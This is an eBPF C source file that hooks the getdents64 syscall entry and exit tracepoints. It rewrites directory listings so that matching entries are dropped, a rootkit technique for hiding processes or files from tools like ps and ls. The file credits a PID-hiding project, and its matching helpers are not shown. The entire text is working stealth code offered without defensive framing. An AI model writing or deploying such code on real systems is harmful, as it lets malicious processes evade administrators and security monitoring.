// Inspired by https://github.com/Acceis/eBPF-hide-PID — thanks <3
//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "getdents.h"
#include "getdents_helpers.c" 

SEC("tp/syscalls/sys_enter_getdents64")
int hook_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
{
   u32 pid = bpf_get_current_pid_tgid() >> 32;
   u64 dirents_buf = 0;
   bpf_core_read(&dirents_buf, sizeof(dirents_buf), &ctx->args[1]);
   bpf_map_update_elem(&dirent_buf_map, &pid, &dirents_buf, BPF_ANY);
   return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int hook_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
   u64 pid = bpf_get_current_pid_tgid() >> 32;
   u64 *dirents_buf = lookup_dirent_buf(&pid);
   if (!dirents_buf) {
      return 0;
   }
   long ret = 0;
   bpf_core_read(&ret, sizeof(ret), &ctx->ret);
   dirent_scan_t scan = {
      .bpos = 0,
      .dirents_buf = dirents_buf,
      .buf_size = ret,
      .reclen = 0,
      .reclen_prev = 0,
      .patch_succeeded = false,
   };
   do {
      scan.patch_succeeded = false;
      scan.bpos = 0;
      scan.reclen_prev = 0;
      bpf_loop(MAX_DIRENTS, hide_dirent_if_match, &scan, 0);
   } while (scan.patch_succeeded);
   bpf_map_delete_elem(&dirent_buf_map, &pid);
   return 0;
}
char LICENSE[] SEC("license") = "GPL";
